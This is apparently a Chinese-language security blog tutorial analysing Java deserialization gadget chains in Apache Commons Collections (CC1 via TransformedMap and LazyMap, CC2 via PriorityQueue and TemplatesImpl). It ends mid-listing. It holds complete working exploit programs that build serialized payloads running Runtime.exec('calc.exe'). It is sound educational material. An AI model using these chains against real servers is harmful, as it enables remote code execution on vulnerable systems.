[{"content":"【Java反序列化】CommonsCollections链 Java反序列化 什么是序列化和反序列化 如果我们需要持久化 Java 对象比如将 Java 对象保存在文件中，或者在网络传输 Java 对象，这些场景都需要用到序列化。\n序列化：将数据结构或对象转换成二进制字节流的过程 反序列化：将在序列化过程中所生成的二进制字节流转换成数据结构或者对象的过程 下面是序列化和反序列化常见应用场景：\n对象在进行网络传输（比如远程方法调用 RPC 的时候）之前需要先被序列化，接收到序列化的对象之后需要再进行反序列化； 将对象存储到文件之前需要进行序列化，将对象从文件中读取出来需要进行反序列化； 将对象存储到数据库（如 Redis）之前需要用到序列化，将对象从缓存数据库中读取出来需要反序列化； 将对象存储到内存之前需要进行序列化，从内存中读取出来之后需要进行反序列化。 综上：序列化的主要目的是通过网络传输对象或者说是将对象存储到文件系统、数据库、内存中。\n​​\nCommonsCollections1 版本适用范围 Commons-Collections 3.1-3.2.1\nJava JDK \u0026lt; 8u71\nTransformerMap链 PoC展示 这是一段PoC，运行后会弹出一个计算器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example.cc; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //触发漏洞 onlyElement.setValue(\u0026#34;foobar\u0026#34;); } } PoC调用分析 先debug看看调用链，整个过程从onlyElement.setValue(\u0026quot;foobar\u0026quot;)​开始，每段代码只取相关的片段。\n源码的注释需要下载CommonsCollections源码查看，debug时是没有的。\nAbstractInputCheckedMapDecorator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // org. apache. commons. collections. map. AbstractInputCheckedMapDecorator protected abstract Object checkSetValue(Object var1);//3 /** * Implementation of a map entry that checks additions via setValue. */ static class MapEntry extends AbstractMapEntryDecorator { private final AbstractInputCheckedMapDecorator parent; /** The parent map */ protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) {//1 value = this.parent.checkSetValue(value);//2 return this.entry.setValue(value); } } 如代码注释里的顺序所示，程序先到AbstractInputCheckedMapDecorator的子类MapEntry，在2处调用3处的checkSetValue，但是这里的checkSetValue是抽象函数，程序运行时会根据实例调用对应的实现。\ncheckSetValue对应的实现有两个如下：\n​​\n根据PoC的代码，这里会执行TransformMap里定义的checkSetValue。\nTransformedMap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // org. apache. commons. collections. map. TransformedMap extends AbstractInputCheckedMapDecorator // protected final Transformer keyTransformer; protected final Transformer valueTransformer; /** * Factory method to create a transforming map. * \u0026lt;p\u0026gt; * If there are any elements already in the map being decorated, they * are NOT transformed. * Constrast this with {@link #decorateTransform}. * * @param map the map to decorate, must not be null * @param keyTransformer the transformer to use for key conversion, null means no transformation * @param valueTransformer the transformer to use for value conversion, null means no transformation * @throws IllegalArgumentException if map is null */ public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } /** * Constructor that wraps (not copies). */ protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } /** * Override to transform the value when using \u0026lt;code\u0026gt;setValue\u0026lt;/code\u0026gt;. * * @param value the value to transform * @return the transformed value * @since Commons Collections 3.1 */ protected Object checkSetValue(Object value) {//1 return this.valueTransformer.transform(value);//2 } 该类是对上文AbstractInputCheckedMapDecorator的继承，实现了checkSetValue。\n该类还与PoC中Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain)​有关。\nPoC中构造的transformers变量先到transformerChain再到outerMap，outerMap是TransformedMap类型的一个实例。\n2处的transform是接口Transformer中定义的类，程序运行时会根据实例调用对应的实现。\ntransform对应的实现有21个如下：\n​​\n根据PoC中的代码，这里会运行ChainedTransformer类实现的transform。\nChainedTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // org. apache. commons. collections. functors. ChainedTransformer implements Transformer private final Transformer[] iTransformers; /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) {//1 for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object);//2 } return object; } ChainedTransformer实现了Transformer接口，实现了transform。\n2处的transform也是接口Transformer中定义的类，程序运行时会根据实例调用对应的实现。\ntransform对应的实现有21个如下：\n​​\n根据PoC中transformers变量的定义，该循环会先调用一次ConstantTransformer中实现的transform，再调用三次InvokerTransformer中实现的transform。\nConstantTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // org. apache. commons. collections. functors. ConstantTransformer implements Transformer private final Object iConstant; public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) {//1 return this.iConstant;//2 } 根据PoC中new ConstantTransformer(Runtime.class)​，2处返回的是java.lang.Runtime。\n由此可见PoC中onlyElement.setValue(\u0026quot;foobar\u0026quot;)​，值为多少都无所谓。\nInvokerTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // org. apache. commons. collections. functors. InvokerTransformer private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; /** * Constructor that performs no validation. * Use \u0026lt;code\u0026gt;getInstance\u0026lt;/code\u0026gt; if you want that. * * @param methodName the method to call * @param paramTypes the constructor parameter types, not cloned * @param args the constructor arguments, not cloned */ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } /** * Transforms the input to result by invoking a method on the input. * * @param input the input object to transform * @return the transformed result, null if null input */ public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//1 Method method = cls.getMethod(iMethodName, iParamTypes);//2 return method.invoke(input, iArgs);//3 } catch (NoSuchMethodException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } 此处是整个PoC的关键，关键代码是1、2、3处，这里和上面的java.lang.Runtime最终构成了Runtime.getRuntime().exec(\u0026ldquo;calc.exe\u0026rdquo;)。\n下面重点分析此处代码。\nPoC构造分析 通过反射实现Runtime.getRuntime().exec(\u0026ldquo;calc.exe\u0026rdquo;) 需要了解Java反射以及forName、getMethod、invoke函数。\n下面主要看下源码里对这三个函数的注释描述。\nforName 1 2 3 4 5 6 7 8 9 10 11 /** * Returns the Class object associated with the class or interface with the given string name. * @param className the fully qualified name of the desired class. * @return the Class object for the class with the specified name. */ @CallerSensitive public static Class\u0026lt;?\u0026gt; forName(String className) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); return forName0(className, true, ClassLoader.getClassLoader(caller), caller); } getMethod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /** * Returns a Method object that reflects the specified public member method of the class or interface represented by this Class object. * The name parameter is a String specifying the simple name of the desired method. * The parameterTypes parameter is an array of Class objects that identify the method\u0026#39;s formal parameter types, in declared order. * If parameterTypes is null, it is treated as if it were an empty array. * * Static methods declared in superinterfaces of the class or interface * represented by this Class object are not considered members of * the class or interface. * * @param name the name of the method * @param parameterTypes the list of parameters * @return the Method object that matches the specified name and parameterTypes */ @CallerSensitive public Method getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) throws NoSuchMethodException, SecurityException { checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true); Method method = getMethod0(name, parameterTypes, true); if (method == null) { throw new NoSuchMethodException(getName() + \u0026#34;.\u0026#34; + name + argumentTypesToString(parameterTypes)); } return method; } invoke 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * Invokes the underlying method represented by this Method * object, on the specified object with the specified parameters. * * If the underlying method is static, then the specified obj argument is ignored. It may be null * * @param obj the object the underlying method is invoked from * @param args the arguments used for the method call * @return the result of dispatching the method represented by */ @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } 因此有\n​[Runtime类].getMethod([方法exec]).invoke([Runtime实例],[参数calc.exe])​\n由于Runtime的无参构造函数由private修饰，因为无法用newInstance构造，采用getRuntime方法构造。\n因此有反射构造：\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(Class.forName(\u0026#34;java.lang.Runtime\u0026#34;))//此处在获取类 , \u0026#34;calc.exe\u0026#34; ); invoke源码中对该函数有一段特别重要的注释，单独拿出来说：\nIf the underlying method is static, then the specified obj argument is ignored. It may be null\n因为getMethod是static方法，因此反射构造可以改写为：\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(null)//此处在获取类 , \u0026#34;calc.exe\u0026#34; ); 依据反射构造ChainedTransformer InvokerTransformer里有一段重要代码是构造的关键：\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); 改造一下便是：\n1 2 3 input.getClass() .getMethod(iMethodName, iParamTypes) .invoke(input, iArgs) 根据该结构改造反射构造：\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null).getClass() .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(null) , \u0026#34;calc.exe\u0026#34; ); 即为了匹配样式，把Class.forName(\u0026quot;java.lang.Runtime\u0026quot;)​改为Class.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(null).getClass()​。\n根据ChainedTransformer的源码可知，上一层transform的结果会是这一层transform的参数，因此有：\nstep1 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null) return input.getClass() .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke(input, \u0026#34;calc.exe\u0026#34;) new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) step2 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;) return input.getClass() .getMethod(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}) .invoke(input, new Object[] {null, new Object[0]}) new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}) step3 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) return input.getClass() .getMethod(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class}) .invoke(input, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0]}) new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), step4 1 new ConstantTransformer(Runtime.class) 至此PoC中的transformers构造完成\nExp构造分析 Exp需要对PoC进行改写，使只要服务端执行了readObject函数就等于命令执行，这样更容易触发漏洞。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example.cc; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); /*Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\u0026#34;foobar\u0026#34;);*/ Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(SuppressWarnings.class, outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream fos = new FileOutputStream(\u0026#34;payload.bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); //服务端读取文件，反序列化，模拟网络传输 FileInputStream fis = new FileInputStream(\u0026#34;payload.bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } 和PoC相比，Exp主要增加了一个AnnotationInvocationHandler类的使用，下面主要分析一下AnnotationInvocationHandler相关代码。\nAnnotationInvocationHandler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private final Class\u0026lt;? extends Annotation\u0026gt; type; private final Map\u0026lt;String, Object\u0026gt; memberValues; AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { this.type = var1; this.memberValues = var2; } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey();//1 Class var7 = (Class)var3.get(var6);//2 if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6)));//3 } } } } 在源码处下断，调试程序，可以看到此处各个变量的值：\n​​\n可以看到在3处，触发了AbstractMapEntryDecorator的调用，这就与PoC调用分析中的AbstractInputCheckedMapDecorator对应上了。\n在构造Exp时需要特别注意1、2处的代码。\n1处代码和Exp中的innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;hack\u0026quot;);​有关；2处的代码和Exp中的Object o = ctor.newInstance(SuppressWarnings.class, outerMap);​有关。\nSuppressWarnings类的代码如下：\n1 2 3 4 5 @Target({ElementType.TYPE, ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.CONSTRUCTOR, ElementType.LOCAL_VARIABLE}) @Retention(RetentionPolicy.SOURCE) public @interface SuppressWarnings { String[] value(); } 可见若innerMap.put的key值不是value，或者SuppressWarnings类中没有value方法，1、2处代码就无法顺利执行。\n除了SuppressWarnings类，还有Target类和Retention类，它们的代码分别如下：\n1 2 3 4 5 6 @Documented @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.ANNOTATION_TYPE}) public @interface Target { ElementType[] value(); } 1 2 3 4 5 6 @Documented @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.ANNOTATION_TYPE}) public @interface Retention { RetentionPolicy value(); } LazyMap链 Exp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example.cc; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1L { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); //innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //给予map数据转化链 Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith); Object o = ctor.newInstance(SuppressWarnings.class, mapProxy); //payload序列化写入文件，模拟网络传输 FileOutputStream fos = new FileOutputStream(\u0026#34;payload.bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); //服务端读取文件，反序列化，模拟网络传输 FileInputStream fis = new FileInputStream(\u0026#34;payload.bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } ‍\nExp构造分析 LazyMap 知道了TransformerMap链的原理，我们尝试逆调用链分析一下。\n根据TransformerMap链的分析，我们需要再找一个类，调用了ChainedTransformer的transformer方法。\n查看ChainedTransformer的transformer的调用关系，就可以看到LazyMap：\n​​\n分析LazyMap源码，若key不存在，则调用Transformer的transform方法。\n1 2 3 4 5 6 7 8 9 10 protected final Transformer factory; public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 接下来需要找那里可以调用这个get方法的地方。\nAnnotationInvocationHandler 在TransformerMap链中分析过，AnnotationInvocationHandler的readObject方法只有调用了setValue方法，没有调用get方法。\n那是否还有别的地方可以利用呢？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 private final Class\u0026lt;? extends Annotation\u0026gt; type; private final Map\u0026lt;String, Object\u0026gt; memberValues; AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { this.type = var1; this.memberValues = var2; } public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; var5.length == 1 \u0026amp;\u0026amp; var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; if (var4.equals(\u0026#34;toString\u0026#34;)) { return this.toStringImpl(); } else if (var4.equals(\u0026#34;hashCode\u0026#34;)) { return this.hashCodeImpl(); } else if (var4.equals(\u0026#34;annotationType\u0026#34;)) { return this.type; } else { Object var6 = this.memberValues.get(var4);//1 if (var6 == null) { throw new IncompleteAnnotationException(this.type, var4); } else if (var6 instanceof ExceptionProxy) { throw ((ExceptionProxy)var6).generateException(); } else { if (var6.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(var6) != 0) { var6 = this.cloneArray(var6); } return var6; } } } } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator();//2 while(var4.hasNext()) { Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6))); } } } } 发现invoke函数的1处，若this.memberValues是LazyMap则可以触发get函数。\n那么可以利用AnnotationInvocationHandler实现了InvocationHandler，是一个动态代理类的特点，创建一个LazyMap的代理。（动态代理详见Java动态代理）\n即Exp中的\n​InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap)​\n​Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith)​\n当mapProxy调用一个方法时，这个方法的调用就会被转发到实现了InvocationHandler接口类的AnnotationInvocationHandler的invoke方法来调用。\n而readObject函数的2处，刚好通过mapProxy调用了entrySet方法，此时就会触发invoke函数的1处。\n因此有Exp代码中的Object o = ctor.newInstance(SuppressWarnings.class, mapProxy)​\n这样整个调用链就完成了。\nps：我们在TransformerMap链中提到了构造AnnotationInvocationHandler实例时要用SuppressWarnings类、Target类或Retention类，但LazyMap链在2处即可触发，不涉及后面的代码，因此此处任意Annotation类的继承类都可以。\nCommonsCollections2 版本适用范围 commons-collections4 4.0\nPriorityQueue链 Exp展示 commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，因此CommonCollections1中的利用链无法使用，需要另找别的利用链。\nCommonCollections2的思路是创建一个类，在该类中构造一个包含payload的static代码块，那么JVM加载类时会执行这些静态的代码块，就会触发payload。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommomsCollections2 { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //创建一个空的类初始化，设置构造函数主体为runtime byte[] bytes=payload.toBytecode();//转换为byte数组 Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//反射获取templatesImpl的_bytecodes字段 field.setAccessible(true);//暴力反射 field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组 Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//反射获取templatesImpl的_name字段 field1.setAccessible(true);//暴力反射 field1.set(templatesImpl,\u0026#34;test\u0026#34;);//将templatesImpl上的_name字段设置为test InvokerTransformer transformer=new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象 PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。 queue.add(1);//添加数字1插入此优先级队列 queue.add(2);//添加数字1插入此优先级队列 Field field2=queue.getClass().getDeclaredField(\u0026#34;comparator\u0026#34;);//获取PriorityQueue的comparator字段 field2.setAccessible(true);//暴力反射 field2.set(queue,comparator);//设置queue的comparator字段值为comparator Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//获取queue的queue字段 field3.setAccessible(true);//暴力反射 field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Exp构造分析 利用链展示 1 2 3 4 5 6 7 8 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() InvokerTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // org. apache. commons. collections. functors. InvokerTransformer private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; /** * Constructor that performs no validation. * Use \u0026lt;code\u0026gt;getInstance\u0026lt;/code\u0026gt; if you want that. * * @param methodName the method to call * @param paramTypes the constructor parameter types, not cloned * @param args the constructor arguments, not cloned */ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; 